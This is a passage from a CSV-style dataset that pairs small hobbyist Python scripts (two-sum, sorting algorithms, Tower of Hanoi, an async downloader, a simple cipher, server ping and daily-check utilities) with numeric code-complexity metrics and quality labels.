",1548,29,29,9,12,10,0,1.0,7,15,6,28.0,14,,43,68.81274391313339,185.8429080801566,6.0,medio,No,False,False,Medium,id398
two_num.py,"""""""Author Anurag Kumar (mailto:anuragkumarak95@gmail.com)

Given an array of integers, return indices of the two numbers
such that they add up to a specific target.
You may assume that each input would have exactly one solution,
and you may not use the same element twice.

Example:
Given nums = [2, 7, 11, 15], target = 9,
Because nums[0] + nums[1] = 2 + 7 = 9,
return [0, 1].

""""""


def twoSum(nums, target):
    chk_map = {}
    for index, val in enumerate(nums):
        compl = target - val
        if compl in chk_map:
            indices = [chk_map[compl], index]
            print(indices)
            return [indices]
        else:
            chk_map[val] = index
    return False
",691,12,11,5,0,0,10,1.0,3,2,2,4.0,4,6.0,6,10.0,15.509775004326936,1.0,alto,No,False,False,Low,id399
question 6.py,"""""""Write a function in python to count the number of lowercase
alphabets present in a text file âhappy.txt""""""

from counter import Counter

def lowercase():

    with open(""happy.txt"") as F:
        word_counter = Counter(F.read())
        
        print(f""The total number of lower case letters are {word_counter.get_total_lower()}"")
        print(f""The total number of upper case letters are {word_counter.get_total_upper()}"")
        print(f""The total number of letters are {word_counter.get_total()}"")

if __name__ == ""__main__"":
    lowercase()
",568,10,9,5,0,0,2,1.0,1,1,1,2.0,2,,3,2.0,4.754887502163469,0.5,alto,No,False,False,Low,id400
friday.py,"import pyttsx3
import os

var = 1

while var > 0:
    pyttsx3.speak(""How can I help you Sir"")
    print(""How can I help you Sir : "", end="""")
    x = input()
    if ((""notepad"" in x) or (""Notepad"" in x)) and (
        (""open"" in x) or (""run"" in x) or (""Open"" in x) or (""Run"" in x)
    ):
        pyttsx3.speak(""Here it is , sir"")
        os.system(""notepad"")
    print(""anything more"")
",400,11,13,2,0,0,0,0.0,0,10,4,22.0,17,,32,77.48686830125578,140.55415752892034,2.588235294117647,medio,No,True,False,Low,id401
TowerOfHanoi.py,"# Recursive Python function to solve the tower of hanoi --

def TowerOfHanoi(n , source, destination, auxiliary):
	if n==1:
		print (""Move disk 1 from source"",source,""to destination"",destination)
		return
	TowerOfHanoi(n-1, source, auxiliary, destination)
	print (""Move disk"",n,""from source"",source,""to destination"",destination)
	TowerOfHanoi(n-1, auxiliary, destination, source)
		
# Driver code
n = 4
TowerOfHanoi(n,'A','B','C')
# A, C, B are the name of rods
",462,9,9,2,3,3,0,1.0,2,3,2,,2,,9,4.0,18.0,3.0,alto,No,False,False,Low,id402
async_downloader.py,"""""""
It's example of usage asyncio+aiohttp to downloading.
You should install aiohttp for using:
(You can use virtualenv to testing)
pip install -r /path/to/requirements.txt
""""""

import asyncio
from os.path import basename

import aiohttp


def download(ways):
    if not ways:
        print(""Ways list is empty. Downloading is impossible"")
        return

    print(""downloading.."")

    success_files = set()
    failure_files = set()

    event_loop = asyncio.get_event_loop()
    try:
        event_loop.run_until_complete(
            async_downloader(ways, event_loop, success_files, failure_files)
        )
    finally:
        event_loop.close()

    print(""Download complete"")
    print(""-"" * 100)

    if success_files:
        print(""success:"")
        for file in success_files:
            print(file)

    if failure_files:
        print(""failure:"")
        for file in failure_files:
            print(file)


async def async_downloader(ways, loop, success_files, failure_files):
    async with aiohttp.ClientSession() as session:
        coroutines = [
            download_file_by_url(
                url,
                session=session,
            )
            for url in ways
        ]

        for task in asyncio.as_completed(coroutines):
            fail, url = await task

            if fail:
                failure_files.add(url)
            else:
                success_files.add(url)


async def download_file_by_url(url, session=None):
    fail = True
    file_name = basename(url)

    assert session

    try:
        async with session.get(url) as response:
            if response.status == 404:
                print(
                    ""\t{} from {} : Failed : {}"".format(
                        file_name, url, ""404 - Not found""
                    )
                )
                return fail, url

            if not response.status == 200:
                print(
                    ""\t{} from {} : Failed : HTTP response {}"".format(
                        file_name, url, response.status
                    )
                )
                return fail, url

            data = await response.read()

            with open(file_name, ""wb"") as file:
                file.write(data)

    except asyncio.TimeoutError:
        print(""\t{} from {}: Failed : {}"".format(file_name, url, ""Timeout error""))

    except aiohttp.client_exceptions.ClientConnectionError:
        print(
            ""\t{} from {}: Failed : {}"".format(
                file_name, url, ""Client connection error""
            )
        )

    else:
        print(""\t{} from {} : Success"".format(file_name, url))
        fail = False

    return fail, url


def test():
    ways = [
        ""https://www.wikipedia.org"",
        ""https://www.ya.ru"",
        ""https://www.duckduckgo.com"",
        ""https://www.fail-path.unknown"",
    ]

    download(ways)


if __name__ == ""__main__"":
    test()
",2914,63,87,30,0,0,6,,18,6,3,10.0,9,,16,33.28421251514428,57.3594000115385,1.6666666666666667,medio,No,False,False,Low,id403
Linear_Insertion_Sort.py,"def Linear_Search(Test_arr, val):
    index = 0
    for i in range(len(Test_arr)):
        if val > Test_arr[i]:
            index = i + 1
    return index


def Insertion_Sort(Test_arr):
    for i in range(1, len(Test_arr)):
        val = Test_arr[i]
        j = Linear_Search(Test_arr[:i], val)
        Test_arr.pop(i)
        Test_arr.insert(j, val)
    return Test_arr


if __name__ == ""__main__"":
    Test_list = input(""Enter the list of Numbers: "").split()
    Test_list = [int(i) for i in Test_list]
    print(f""Binary Insertion Sort: {Insertion_Sort(Test_list)}"")
",572,18,17,4,0,0,0,2.0,5,3,3,6.0,6,,9,20.264662506490406,28.529325012980813,1.5,medio,No,True,False,,id404
stack.py,"# Python program to reverse a string using stack

# Function to create an empty stack.
# It initializes size of stack as 0
def createStack():
    stack = []
    return stack


# Function to determine the size of the stack
def size(stack):
    return len(stack)


# Stack is empty if the size is 0
def isEmpty(stack):
    if size(stack) == 0:
        return True


# Function to add an item to stack .
# It increases size by 1
def push(stack, item):
    stack.append(item)


# Function to remove an item from stack.
# It decreases size by 1
def pop(stack):
    if isEmpty(stack):
        return
    return stack.pop()


# A stack based function to reverse a string
def reverse(string):
    n = len(string)

    # Create a empty stack
    stack = createStack()

    # Push all characters of string to stack
    for i in range(0, n, 1):
        push(stack, string[i])

    # Making the string empty since all
    # characters are saved in stack
    string = """"

    # Pop all characters of string and
    # put them back to string
    for i in range(0, n, 1):
        string += pop(stack)

    return string


# Driver program to test above functions
string = ""GeeksQuiz""
string = reverse(string)
print(""Reversed string is "" + string)

# This code is contributed by Yash
",1268,26,26,19,18,18,0,6.0,10,3,2,6.0,6,,9,17.509775004326936,27.0,1.0,alto,No,False,False,Low,id405
linear search.py,"#Author : ShankRoy

def linearsearch(arr, x):
   for i in range(len(arr)):
      if arr[i] == x:
         return i
   return -1
arr = ['t','u','t','o','r','i','a','l']
x = 'a'
print(""element found at index ""+str(linearsearch(arr,x)))
",234,8,8,1,1,1,0,1.0,3,3,3,5.0,5,,8,16.36452797660028,24.0,1.5,alto,No,False,False,Low,id406
time_delta.py,"""""""Time Delta Solution """"""


# -----------------------------------------------------------------------------
# You are givent two timestams in the format: Day dd Mon yyyy hh:mm:ss +xxxx
# where +xxxx represents the timezone.

# Input Format:
# The first line contains T, the number of test cases.
# Each test case contains two lines, representing the t1 and t2 timestamps.

# Constraints:
# input contains only valid timestamps.
# year is  < 3000.

# Output Format:
# Print the absoulte diffrence (t2 - t1) in seconds.

# Sample Input:
# 2
# Sun 10 May 2015 13:54:36 -0700
# Sun 10 May 2015 13:54:36 -0000
# Sat 02 May 2015 19:54:36 +0530
# Fri 01 May 2015 13:54:36 -0000

# Sample Output:
# 25200
# 88200
#------------------------------------------------------------------------------

# Imports
import math
import os 
import random
import re
import sys
import datetime

# Complete the time_delta function below.
def time_delta(t1, t2):
    """"""
    Calculate the time delta between two timestamps in seconds.
    """"""
    # Convert the timestamps to datetime objects
    t1 = datetime.datetime.strptime(t1, '%a %d %b %Y %H:%M:%S %z')
    t2 = datetime.datetime.strptime(t2, '%a %d %b %Y %H:%M:%S %z')

    return (t1 - t2)



if __name__ == '__main__':

    t = int(input())

    for itr_t in range(t):
        t1 = input()

        t2 = input()

        delta = time_delta(t1, t2)
        # print Delta with 1 Decimal Place
        print(round(delta.total_seconds(), 1))




",1476,19,17,21,25,26,3,1.0,1,2,2,4.0,4,,6,10.0,15.509775004326936,1.0,medio,No,True,True,Low,id407
Counting-sort.py,"# python program for counting sort (updated)
n = int(input(""please give the number of elements\n""))
print(""okey now plase enter n numbers seperated by spaces"")
tlist = list(map(int, input().split()))
k = max(tlist)
n = len(tlist)


def counting_sort(tlist, k, n):

    """"""Counting sort algo with sort in place.
    Args:
        tlist: target list to sort
        k: max value assume known before hand
        n: the length of the given list
        map info to index of the count list.
    Adv:
        The count (after cum sum) will hold the actual position of the element in sorted order
        Using the above,

    """"""

    # Create a count list and using the index to map to the integer in tlist.
    count_list = [0] * (k + 1)

    # iterate the tgt_list to put into count list
    for i in range(0, n):
        count_list[tlist[i]] += 1

    # Modify count list such that each index of count list is the combined sum of the previous counts
    # each index indicate the actual position (or sequence) in the output sequence.
    for i in range(1, k + 1):
        count_list[i] = count_list[i] + count_list[i - 1]

    flist = [0] * (n)
    for i in range(n - 1, -1, -1):
        count_list[tlist[i]] = count_list[tlist[i]] - 1
        flist[count_list[tlist[i]]] = tlist[i]

    return flist


flist = counting_sort(tlist, k, n)
print(flist)
",1350,19,18,11,5,5,10,1.0,4,11,4,20.0,11,,31,46.05374780501028,121.11360846386408,3.636363636363636,alto,No,True,False,Low,id408
ex20.py,"from sys import argv

script, input_file = argv


def print_all(f):
    print(f.read())


# seek(n) to read a file's content from byte-n
def rewind(f):
    f.seek(0)


def print_a_line(line_count, f):
    print(line_count, f.readline())


current_file = open(input_file)

print(""First let's print the whole file:\n"")
print_all(current_file)

print(""Now let's rewind, kind of like a tape."")
rewind(current_file)

print(""Let's print three lines:"")
current_line = 1
print_a_line(current_line, current_file)

current_line = current_line + 1
print_a_line(current_line, current_file)

current_line = current_line + 1
print_a_line(current_line, current_file)

current_file.close()
",674,21,21,15,1,1,0,3.0,3,2,1,4.0,2,,6,2.0,9.509775004326938,1.0,medio,No,False,False,Low,id409
move_files_over_x_days.py,"# Script Name   : move_files_over_x_days.py
# Author(s)     : Craig Richards ,Demetrios Bairaktaris
# Created       : 8th December 2011
# Last Modified : 25 December 2017
# Version       : 1.1
# Modifications : Added possibility to use command line arguments to specify source, destination, and days.
# Description   : This will move all the files from the src directory that are over 240 days old to the destination directory.

import argparse
import os
import shutil
import time

usage = ""python move_files_over_x_days.py -src [SRC] -dst [DST] -days [DAYS]""
description = ""Move files from src to dst if they are older than a certain number of days.  Default is 240 days""

args_parser = argparse.ArgumentParser(usage=usage, description=description)
args_parser.add_argument(
    ""-src"",
    ""--src"",
    type=str,
    nargs=""?"",
    default=""."",
    help=""(OPTIONAL) Directory where files will be moved from. Defaults to current directory"",
)
args_parser.add_argument(
    ""-dst"",
    ""--dst"",
    type=str,
    nargs=""?"",
    required=True,
    help=""(REQUIRED) Directory where files will be moved to."",
)
args_parser.add_argument(
    ""-days"",
    ""--days"",
    type=int,
    nargs=""?"",
    default=240,
    help=""(OPTIONAL) Days value specifies the minimum age of files to be moved. Default is 240."",
)
args = args_parser.parse_args()

if args.days < 0:
    args.days = 0

src = args.src  # Set the source directory
dst = args.dst  # Set the destination directory
days = args.days  # Set the number of days
now = time.time()  # Get the current time

if not os.path.exists(dst):
    os.mkdir(dst)

for f in os.listdir(src):  # Loop through all the files in the source directory
    if (
        os.stat(f).st_mtime < now - days * 86400
    ):  # Work out how old they are, if they are older than 240 days old
        if os.path.isfile(f):  # Check it's a file
            shutil.move(f, dst)  # Move the files
",1973,23,46,7,15,7,0,,0,5,4,9.0,8,,14,32.0,50.18947501009619,2.25,alto,No,False,False,Low,id410
Cycle Sort.py,"# Python program to impleament cycle sort


def cycleSort(array):
    writes = 0

    # Loop through the array to find cycles to rotate.
    for cycleStart in range(0, len(array) - 1):
        item = array[cycleStart]

        # Find where to put the item.
        pos = cycleStart
        for i in range(cycleStart + 1, len(array)):
            if array[i] < item:
                pos += 1

        # If the item is already there, this is not a cycle.
        if pos == cycleStart:
            continue

        # Otherwise, put the item there or right after any duplicates.
        while item == array[pos]:
            pos += 1
        array[pos], item = item, array[pos]
        writes += 1

        # Rotate the rest of the cycle.
        while pos != cycleStart:

            # Find where to put the item.
            pos = cycleStart
            for i in range(cycleStart + 1, len(array)):
                if array[i] < item:
                    pos += 1

            # Put the item there or right after any duplicates.
            while item == array[pos]:
                pos += 1
            array[pos], item = item, array[pos]
            writes += 1

    return writes


#  driver code
arr = [1, 8, 3, 9, 10, 10, 2, 4]
n = len(arr)
cycleSort(arr)

print(""After sort : "")
for i in range(0, n):
    print(arr[i], end="" "")
print()  # Print a newline
",1359,31,31,13,10,9,0,1.0,10,15,5,30.0,10,,45,44.82892142331043,175.81007680238335,7.5,medio,No,False,False,Medium,id411
leap year.py,"# Python program to check if year is a leap year or not

year = 2000

# To get year (integer input) from the user
# year = int(input(""Enter a year: ""))

if (year % 4) == 0:
   if (year % 100) == 0:
       if (year % 400) == 0:
           print(""{0} is a leap year"".format(year))
       else:
           print(""{0} is not a leap year"".format(year))
   else:
       print(""{0} is a leap year"".format(year))
else:
   print(""{0} is not a leap year"".format(year))
",459,11,11,3,3,3,0,0.0,0,6,2,12.0,8,,18,26.0,59.794705707972525,1.5,alto,No,True,False,Low,id412
powerup_checks.py,"from __future__ import print_function

import os  # Load the Library Module
import sqlite3  # Load the Library Module
import subprocess  # Load the Library Module
import sys  # Load the Library Module
from time import strftime  # Load just the strftime Module from Time

# Script Name		: powerup_checks.py
# Author				: Craig Richards
# Created				: 25th June 2013
# Last Modified		:
# Version				: 1.0
# Modifications		:
# Description			: Creates an output file by pulling all the servers for the given site from SQLITE database, then goes through the list pinging the servers to see if they are up on the network

dropbox = os.getenv(
    ""dropbox""
)  # Set the variable, by getting the value of the variable from the OS
config = os.getenv(
    ""my_config""
)  # Set the variable, by getting the value of the variable from the OS
dbfile = ""Databases/jarvis.db""  # Set the variable to the database
master_db = os.path.join(
    dropbox, dbfile
)  # Create the variable by linking the path and the file
listfile = ""startup_list.txt""  # File that will hold the servers
serverfile = os.path.join(
    config, listfile
)  # Create the variable by linking the path and the file
outputfile = ""server_startup_"" + strftime(""%Y-%m-%d-%H-%M"") + "".log""

# Below is the help text

text = """"""

You need to pass an argument, the options the script expects is 

    -site1		For the Servers relating to site1
    -site2	For the Servers located in site2""""""


def windows():  # This is the function to run if it detects the OS is windows.
    f = open(outputfile, ""a"")  # Open the logfile
    for server in open(serverfile, ""r""):  # Read the list of servers from the list
        # ret = subprocess.call(""ping -n 3 %s"" % server.strip(), shell=True,stdout=open('NUL', 'w'),stderr=subprocess.STDOUT)	# Ping the servers in turn
        ret = subprocess.call(
            ""ping -n 3 %s"" % server.strip(),
            stdout=open(""NUL"", ""w""),
            stderr=subprocess.STDOUT,
        )  # Ping the servers in turn
        if ret == 0:  # Depending on the response
            f.write(
                ""%s: is alive"" % server.strip().ljust(15) + ""\n""
            )  # Write out to the logfile is the server is up
        else:
            f.write(
                ""%s: did not respond"" % server.strip().ljust(15) + ""\n""
            )  # Write to the logfile if the server is down


def linux():  # This is the function to run if it detects the OS is nix.
    f = open(""server_startup_"" + strftime(""%Y-%m-%d"") + "".log"", ""a"")  # Open the logfile
    for server in open(serverfile, ""r""):  # Read the list of servers from the list
        ret = subprocess.call(
            ""ping -c 3 %s"" % server,
            shell=True,
            stdout=open(""/dev/null"", ""w""),
            stderr=subprocess.STDOUT,
        )  # Ping the servers in turn
        if ret == 0:  # Depending on the response
            f.write(
                ""%s: is alive"" % server.strip().ljust(15) + ""\n""
            )  # Write out to the logfile is the server is up
        else:
            f.write(
                ""%s: did not respond"" % server.strip().ljust(15) + ""\n""
            )  # Write to the logfile if the server is down


def get_servers(query):  # Function to get the servers from the database
    conn = sqlite3.connect(master_db)  # Connect to the database
    cursor = conn.cursor()  # Create the cursor
    cursor.execute(
        ""select hostname from tp_servers where location =?"", (query,)
    )  # SQL Statement
    print(""\nDisplaying Servers for : "" + query + ""\n"")
    while True:  # While there are results
        row = cursor.fetchone()  # Return the results
        if row == None:
            break
        f = open(serverfile, ""a"")  # Open the serverfile
        f.write(""%s\n"" % str(row[0]))  # Write the server out to the file
        print(row[0])  # Display the server to the screen
        f.close()  # Close the file


def main():  # Main Function
    if os.path.exists(serverfile):  # Checks to see if there is an existing server file
        os.remove(serverfile)  # If so remove it

    if len(sys.argv) < 2:  # Check there is an argument being passed
        print(text)  # Display the help text if there isn't one passed
        sys.exit()  # Exit the script

    if (
        ""-h"" in sys.argv
        or ""--h"" in sys.argv
        or ""-help"" in sys.argv
        or ""--help"" in sys.argv
    ):  # If the ask for help
        print(text)  # Display the help text if there isn't one passed
        sys.exit(0)  # Exit the script after displaying help
    else:
        if sys.argv[1].lower().startswith(""-site1""):  # If the argument is site1
            query = ""site1""  # Set the variable to have the value site
        elif (
            sys.argv[1].lower().startswith(""-site2"")
        ):  # Else if the variable is bromley
            query = ""site2""  # Set the variable to have the value bromley
        else:
            print(
                ""\n[-] Unknown option [-] "" + text
            )  # If an unknown option is passed, let the user know
            sys.exit(0)
    get_servers(query)  # Call the get servers funtion, with the value from the argument

    if os.name == ""posix"":  # If the OS is linux.
        linux()  # Call the linux function
    elif os.name in (""nt"", ""dos"", ""ce""):  # If the OS is Windows...
        windows()  # Call the windows function

    print(
        ""\n[+] Check the log file "" + outputfile + "" [+]\n""
    )  # Display the name of the log


if __name__ == ""__main__"":
    main()  # Call the main function
",5539,68,109,21,65,9,0,4.0,20,32,6,66.0,60,,98,369.9232107408381,592.3506236971284,3.3,medio,No,False,False,Medium,id413
magic8ball.py,"import random

responses = [
    ""It is certain"",
    ""It is decidedly so"",
    ""Without a doubt"",
    ""Yes definitely "",
    ""You may rely on it"",
    ""As I see it, yes"",
    ""Most likely "",
    ""Outlook good"",
    ""Yes"",
    ""Signs point to yes"",
    ""Do not count on it"",
    ""My reply is no"",
    "" My sources say no"",
    "" Outlook not so good"",
    ""Very doubtful"",
    ""Reply hazy try again"",
    ""Ask again later"",
    ""Better not tell you now "",
    ""Cannot predict now "",
    ""Concentrate and ask again"",
]
print(""Hi! I am the magic 8 ball, what's your name?"")
name = input()
print(""Hello!"" + name)


def magic8Ball():
    print(""Whay's your question? "")
    question = input()
    answer = responses[random.randint(0, len(responses) - 1)]
    print(answer)
    tryAgain()


def tryAgain():
    print(
        ""Do you wanna ask any more questions? press Y for yes and any other key to exit ""
    )
    x = input()
    if x in [""Y"", ""y""]:
        magic8Ball()
    else:
        exit()


magic8Ball()
",1009,19,42,7,0,0,0,2.0,3,3,3,6.0,6,,9,20.264662506490406,28.529325012980813,1.5,medio,No,True,True,Low,id414
encryptsys.py,"import string
from random import randint


def decrypt():
    texto = input(""Input the text to decrypt : "").split(""."")
    abecedario = string.printable + ""Ã¡Ã©Ã­Ã³ÃºÃÃÃÃÃÃ Ã¨Ã¬Ã²Ã¹ÃÃÃÃÃÃ¤Ã«Ã¯Ã¶Ã¼ÃÃÃÃÃÃ±ÃÂ´""
    abecedario2 = []
    nummoves = int(texto[0])
    indexs = []
    finalindexs = []
    textode1 = texto[1]
    textode2 = []

    for l in range(0, len(abecedario)):
        abecedario2.append(abecedario[l])

    for letter in range(0, len(textode1)):
        textode2.append(textode1[letter])

    for index in range(0, len(textode1)):
        indexs.append(abecedario.index(textode1[index]))

    for move in range(nummoves, 0):
        abecedario2 += abecedario2.pop(27)

    for value in indexs:
        newval = value - nummoves
        finalindexs.append(newval)

    textofin = """"

    for i in range(0, len(finalindexs)):
        textofin += abecedario2[finalindexs[i]]

    print(textofin)


def encrypt():

    texto = input(""Input the text to encrypt : "")
    abecedario = string.printable + ""Ã¡Ã©Ã­Ã³ÃºÃÃÃÃÃÃ Ã¨Ã¬Ã²Ã¹ÃÃÃÃÃÃ¤Ã«Ã¯Ã¶Ã¼ÃÃÃÃÃÃ±ÃÂ´""
    abecedario2 = []
    nummoves = randint(1, len(abecedario))
    indexs = []

    texttoenc = []

    for l in range(0, len(abecedario)):
        abecedario2.append(abecedario[l])

    for let in range(0, len(texto)):
        texttoenc.append(texto[let])

    for letter in texto:
        indexs.append(abecedario2.index(letter))

    for move in range(0, nummoves):
        abecedario2 += abecedario2.pop(0)

    texto = []

    for i in range(0, len(indexs)):
        texto.append(abecedario2[indexs[i]])
        texto.append(""."")

    fintext = """"

    for letter2 in range(0, len(texto), 2):
        fintext += texto[letter2]

    fintext = str(nummoves) + ""."" + fintext

    print(""\Encrypted text : "" + fintext)


sel = input(""What would you want to do?\n\n[1] Encrypt\n[2] Decrypt\n\n> "").lower()

if sel in [""1"", ""encrypt""]:
    encrypt()
elif sel in [""2"", ""decrypt""]:
    decrypt()
else:
    print(""Unknown selection."")
",2032,57,57,27,0,0,0,2.0,14,12,3,24.0,21,,36,96.99355338051744,165.05865002596164,1.7142857142857142,bajo,No,True,False,Low,id415
primary_colors.py,"def diff(a, b):
    """"""
    TODO: fix this function!!
    """"""
    return a - b


def simpleColor(r, g, b):
    """"""simpleColor obtiene el nombre del color mas general al cual se acerca su formato R G B""""""
    r = int(r)
    g = int(g)
    b = int(b)
    bg = ir = 0  # TODO: Fix these variables
    try:
        # ROJO --------------------------------------------------
        if r > g and r > b:

            rg = diff(r, g)  # distancia rojo a verde
            rb = diff(r, b)  # distancia rojo a azul

            if g < 65 and b < 65 and rg > 60:  # azul y verde sin luz
                return ""ROJO""

            gb = diff(g, b)  # distancia de verde a azul

            if rg < rb:  # Verde mayor que Azul
                if gb < rg:  # Verde mas cerca de Azul
                    if gb >= 30 and rg >= 80:
                        return ""NARANJA""
                    elif gb <= 20 and rg >= 80:
                        return ""ROJO""
                    elif gb <= 20 and b > 175:
                        return ""CREMA""

                    else:
                        return ""CHOCOLATE""
                else:  # Verde mas cerca de Rojo
                    if rg > 60:
                        return ""NARANJA*""
                    elif r > 125:
                        return ""AMARILLO""
                    else:
                        return ""COCHOLATE""
            elif rg > rb:  # Azul mayor que verde
                if bg < rb:  # Verde mas cerca de Azul
                    if gb < 60:
                        if r > 150:
                            return ""ROJO 2""
                        else:
                            return ""MARRON""
                    elif g > 125:
                        return ""ROSADO""
                    else:
                        return ""ROJO 3""
                else:  # Verde mas cerca de Rojo
                    if rb < 60:
                        if r > 160:
                            return ""ROSADO*""
                        else:
                            return ""ROJO""
                    else:
                        return ""ROJO""

            else:  # g y b iguales
                if rg > 20:
                    if r >= 100 and b < 60:
                        return ""ROJO""
                    elif r >= 100:
                        return ""ROJO""
                    else:
                        return ""MARRON""

                else:
                    return ""GRIS""
        # VERDE ---------------------------------------------------
        elif g > r and g > b:
            gb = diff(g, b)  # distancia verde a azul
            gr = diff(g, r)  # distancia verde a rojo

            if r < 65 and b < 65 and gb > 60:  # rojo y azul sin luz
                return ""VERDE""

            rb = diff(r, b)  # distancia de rojo a azul

            if r > b:  # ROJO > AZUL
                if gr < gb:  # Verde con Rojo

                    if rb >= 150 and gr <= 20:
                        return ""AMARILLO""
                    else:
                        return ""VERDE""
                else:  # ...Verde
                    return ""VERDE""

            elif r < b:  # AZUL > ROJO
                if gb < gr:  # Verde con Azul

                    if gb <= 20:
                        return ""TURQUESA""
                    else:
                        return ""VERDE""
                else:  # ...Verde
                    return ""VERDE""

            else:  # r y b iguales
                if gb > 10:
                    return ""VERDE""
                else:
                    return ""GRIS""

        # AZUL ------------------------------------------------------
        elif b > r and b > g:
            bg = diff(b, g)  # distancia azul a verde
            br = diff(b, r)  # distancia azul a rojo

            if r < 65 and g < 65 and bg > 60:  # rojo y verde sin luz
                return ""AZUL""

            rg = diff(r, g)  # distancia de rojo a verde

            if g < r:  # ROJO  > VERDE
                if bg < rg:  # Azul con Verde
                    if bg <= 20:
                        return ""TURQUESA""
                    else:
                        return ""CELESTE""
                else:  # ...Azul
                    if rg <= 20:
                        if r >= 150:
                            return ""LILA""
                        else:
                            return ""AZUL *************""
                    else:
                        return ""AZUL""

            elif g > r:  #  VERDE > ROJO
                if br < rg:  # Azul con rojo
                    if br <= 20:
                        if r > 150 and g < 75:
                            return ""ROSADO FIUSHA""
                        elif ir > 150:
                            return ""LILA""
                        else:
                            return ""MORADO""
                    else:
                        return ""MORADO""

                else:  # ...Azul
                    if rg <= 20:
                        if bg <= 20:
                            return ""GRIS""
                        else:
                            return ""AZUL""
            else:  # r y g iguales
                if bg > 20:
                    if r >= 100 and b < 60:
                        return ""ROJO""
                    elif r >= 100:
                        return ""ROJO""
                    else:
                        return ""MARRON""
                else:
                    return ""GRIS""

        # IGUALES---------------------------------------
        else:
            return ""GRIS""

    except:

        return ""Not Color""


# ---------------------------------------------------------------------------------------------------
# Puedes probar asi: python primary_colors.py 120,0,0   , esto resultara en un ROJO como respuesta
# --------------------------------------------------------------------------------------------------
if __name__ == ""__main__"":
    import sys

    print(simpleColor(sys.argv[1], sys.argv[2], sys.argv[3]))
",5994,143,141,28,41,8,3,2.0,64,76,7,,55,,231,337.6262686982595,1375.4193476993682,9.863636363636363,bajo,No,False,False,Very High,id416
header_footer.py,"from fpdf import FPDF


# Author: @NavonilDas


class MyPdf(FPDF):
    def header(self):
        # Uncomment the line below to add logo if needed
        # self.image('somelogo.png',12,10,25,25) # Draw Image ar (12,10) with height = 25 and width = 25
        self.set_font(""Arial"", ""B"", 18)
        self.text(27, 10, ""Generating PDF With python"")
        self.ln(10)

    def footer(self):
        # Set Position at 1cm (10mm) From Bottom
        self.set_y(-10)
        # Arial italic 8
        self.set_font(""Arial"", ""I"", 8)
        # set Page number at the bottom
        self.cell(0, 10, ""Page No {}"".format(self.page_no()), 0, 0, ""C"")
        pass


pdf = MyPdf()
# Set Author Name of the PDF
pdf.set_author(""@NavonilDas"")
# Set Subject of The PDF
pdf.set_subject(""python"")
# Set the Title of the PDF
pdf.set_title(""Generating PDF with Python"")
pdf.add_page()

# Set Font family Courier with font size 28
pdf.set_font(""Courier"", """", 18)
# Add Text at (0,50)
pdf.text(0, 50, ""Example to generate PDF in python."")

# Set Font Family Courier with italic and font size 28
pdf.set_font(""Courier"", ""i"", 28)
pdf.text(0, 60, ""This is an italic text"")  # Write text at 0,60

pdf.add_page()

# Center Text With border and a line break with height=10mm
pdf.cell(0, 10, ""Hello There"", 1, 1, ""C"")

# Save the Output at Local File
pdf.output(""output.pdf"", ""F"")
",1352,23,23,12,15,14,0,2.0,4,1,1,1.0,1,,2,0.0,2.0,0.5,alto,Yes,False,False,Low,id417
daily_checks.py,"# Script Name	: daily_checks.py
# Author		: Craig Richards
# Created		: 07th December 2011
# Last Modified	: 01st May 2013
# Version		: 1.5
""""""
Modifications	: 1.1 Removed the static lines for the putty sessions, it now reads a file, loops through and makes the connections.
                : 1.2 Added a variable filename=sys.argv[0] , as when you use __file__ it errors when creating an exe with py2exe.
                : 1.3 Changed the server_list.txt file name and moved the file to the config directory.
                : 1.4 Changed some settings due to getting a new pc
                : 1.5 Tidy comments and syntax

Description	: This simple script loads everything I need to carry out the daily checks for our systems.
""""""
import os
import platform  # Load Modules
import subprocess
import sys
from time import strftime  # Load just the strftime Module from Time


def clear_screen():  # Function to clear the screen
    if os.name == ""posix"":  # Unix/Linux/MacOS/BSD/etc
        os.system(""clear"")  # Clear the Screen
    elif os.name in (""nt"", ""dos"", ""ce""):  # DOS/Windows
        os.system(""CLS"")  # Clear the Screen


def print_docs():  # Function to print the daily checks automatically
    print(""Printing Daily Check Sheets:"")
    # The command below passes the command line string to open word, open the document, print it then close word down
    subprocess.Popen(
        [
            ""C:\\Program Files (x86)\Microsoft Office\Office14\winword.exe"",
            ""P:\\\\Documentation\\Daily Docs\\Back office Daily Checks.doc"",
            ""/mFilePrintDefault"",
            ""/mFileExit"",
        ]
    ).communicate()


def putty_sessions(conffilename):  # Function to load the putty sessions I need
    # Open the file server_list.txt, loop through reading each line
    #  1.1 -Changed - 1.3 Changed name to use variable conffilename
    for server in open(conffilename):
        subprocess.Popen((""putty -load "" + server))  # Open the PuTTY sessions - 1.1


def rdp_sessions():
    print(""Loading RDP Sessions:"")
    subprocess.Popen(
        ""mstsc eclr.rdp""
    )  # Open up a terminal session connection and load the euroclear session


def euroclear_docs():
    # The command below opens IE and loads the Euroclear password document
    subprocess.Popen(
        '""C:\\Program Files\\Internet Explorer\\iexplore.exe""'
        '""file://fs1\pub_b\Pub_Admin\Documentation\Settlements_Files\PWD\Eclr.doc""'
    )


# End of the functions


# Start of the Main Program
def main():
    filename = sys.argv[0]  # Create the variable filename
    confdir = os.getenv(
        ""my_config""
    )  # Set the variable confdir from the OS environment variable - 1.3
    conffile = ""daily_checks_servers.conf""  # Set the variable conffile - 1.3
    # Set the variable conffilename by joining confdir and conffile together - 1.3
    conffilename = os.path.join(confdir, conffile)
    clear_screen()  # Call the clear screen function

    # The command below prints a little welcome message, as well as the script name,
    # the date and time and where it was run from.
    print(
        ""Good Morning "" + os.getenv(""USERNAME"") + "", "" + filename,
        ""ran at"",
        strftime(""%Y-%m-%d %H:%M:%S""),
        ""on"",
        platform.node(),
        ""run from"",
        os.getcwd(),
    )

    print_docs()  # Call the print_docs function
    putty_sessions(conffilename)  # Call the putty_session function
    rdp_sessions()  # Call the rdp_sessions function
    euroclear_docs()  # Call the euroclear_docs function


if __name__ == ""__main__"":
    main()
",3668,35,56,19,33,14,8,6.0,9,7,3,14.0,13,,21,52.86060383799767,84.0,1.6153846153846154,alto,No,False,False,Low,id418
checker.py,"""""""
Author : Dhruv B Kakadiya

""""""

import pygame as pg
from .checker_board import *
from .statics import *
from .pieces import *


class checker:
    def __init__(self, window):
        self._init()
        self.window = window

    # to update the position
    def update(self):
        self.board.draw(self.window)
        self.draw_moves(self.valid_moves)
        pg.display.update()

    def _init(self):
        self.select = None
        self.board = checker_board()
        self.turn = black
        self.valid_moves = {}

    # to reset the position
    def reset(self):
        self._init()

    # select row and column
    def selectrc(self, row, col):
        if self.select:
            result = self._move(row, col)
            if not result:
                self.select = None

        piece = self.board.get_piece(row, col)
        if (piece != 0) and (piece.color == self.turn):
